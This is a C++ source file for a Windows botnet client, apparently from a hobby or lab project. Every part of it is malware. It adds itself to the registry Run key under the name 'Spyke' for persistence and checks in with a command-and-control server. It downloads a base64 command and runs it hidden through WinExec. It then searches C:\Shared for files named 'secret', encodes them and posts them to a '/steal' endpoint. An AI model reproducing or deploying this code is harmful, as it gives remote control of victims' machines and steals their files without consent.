// BotnetWin32.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "BotnetWin32.h"
#include "Utils.h"
#include "Connection.h"
#include "base64.h"
#include "DirectoryTraversal.h"

string ip = "192.168.0.45";
//string ip = "192.168.0.10";
TCHAR buf[255] = { 0 };
Utils utils;
Connection conn(ip);
base64 base;

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	//utils.HideConsole();
	//utils.DenyAccess();

	//Accessing the registry value for autoloading

	
	HKEY hKey;
	if(RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
	{
		//Checking if the registry value exists

		DWORD dwType = REG_SZ;
		DWORD dwBufSize = sizeof(buf);
		if(RegQueryValueEx(hKey, L"Spyke", 0, &dwType, (LPBYTE)buf, &dwBufSize) != ERROR_SUCCESS)
			// Creating the registry value for autoloading
			utils.Autoload();
	}
	else
		utils.Autoload();

	// Accessing the registry value for ID

	if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
	{
		//Checking if the registry value exists

		DWORD dwType = REG_SZ;
		DWORD dwBufSize = sizeof(buf);
		if (RegQueryValueExW(hKey, L"ID", 0, NULL, (LPBYTE)buf, &dwBufSize) == ERROR_SUCCESS)
		{
			// Set the class attribute equal to the registry value
			utils.SetID(buf);
		}
		else
		{
			// Generate a new ID and create a new registry value
			utils.GenerateID();
		}
	}
	else
	{
		utils.GenerateID();
	}

	// sending an initial message to C&C
	conn.HTTPPost(utils.GetID(), "I am alive!");

	// getting a command from C&C and starting
	conn.HTTPGet("/cmd");
	vector<BYTE> cmvec = base.base64_decode(conn.GetBuffer());
	string command(cmvec.begin(), cmvec.end());
	WinExec(command.c_str(), SW_HIDE);
	
	vector<string> files;
	FindByFilename("secret", "C:\\Shared", files);
	for (string file : files)
	{
		stringstream ss;
		std::ifstream iff(file, ios::binary);
		ss << iff.rdbuf();
		string contents = ss.str();

		vector<BYTE> byte_array(contents.begin(), contents.end());
		string based_string = base.base64_encode(&byte_array[0], byte_array.size());
		long long pos = file.length() - 1;
		while (file[pos] != '/')
		{
			--pos;
		}
		string short_filename = file.substr(pos + 1);
		conn.HTTPPost(utils.GetID(), short_filename+":"+based_string, "/steal");
	}
	return 0;
}

